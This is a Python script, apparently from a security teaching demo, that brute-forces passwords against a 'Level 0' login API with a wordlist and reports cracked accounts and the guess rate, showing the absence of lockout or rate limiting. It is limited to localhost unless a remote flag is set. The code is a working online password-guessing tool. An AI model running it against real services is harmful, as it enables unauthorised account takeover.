"""Online password guessing against Level 0.

the server answers guess after guess
without slowing down or locking the account.
Standard lib. only.
"""
import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import urlparse

LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1"}


def try_login(base_url: str, username: str, password: str) -> bool:
    req = urllib.request.Request(
        f"{base_url}/api/level0/login",
        data=json.dumps({"username": username, "password": password}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except urllib.error.HTTPError as err:
        if err.code == 401:
            return False
        raise


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--users", default="admin,alice,bob,carol",
                        help="comma-separated usernames (default: the seeded accounts)")
    parser.add_argument("--wordlist", default=str(Path(__file__).with_name("wordlist.txt")))
    parser.add_argument("--allow-remote", action="store_true",
                        help="permit a non-local host (only for a deployment you own)")
    args = parser.parse_args()

    host = urlparse(args.url).hostname
    if host not in LOCAL_HOSTS and not args.allow_remote:
        sys.exit(f"Refusing to target {host}. This script is for your own demo. "
                 "Use --allow-remote only for a deployment you own.")

    words = [w.strip() for w in Path(args.wordlist).read_text().splitlines() if w.strip()]
    users = [u.strip() for u in args.users.split(",") if u.strip()]

    attempts = 0
    started = time.perf_counter()
    try:
        for user in users:
            found = None
            for n, word in enumerate(words, start=1):
                attempts += 1
                if try_login(args.url, user, word):
                    found = (n, word)
                    break
            if found:
                print(f"[+] {user:<8} cracked: {found[1]!r} after {found[0]} guesses")
            else:
                print(f"[-] {user:<8} not in wordlist ({len(words)} guesses, never locked out)")
    except urllib.error.URLError as err:
        sys.exit(f"Could not reach {args.url}: {err.reason}. Is the server running?")

    elapsed = time.perf_counter() - started
    print(f"\n{attempts} guesses in {elapsed:.2f}s ({attempts / elapsed:.0f}/s). "
          "The server never slowed down or locked an account.")


if __name__ == "__main__":
    main()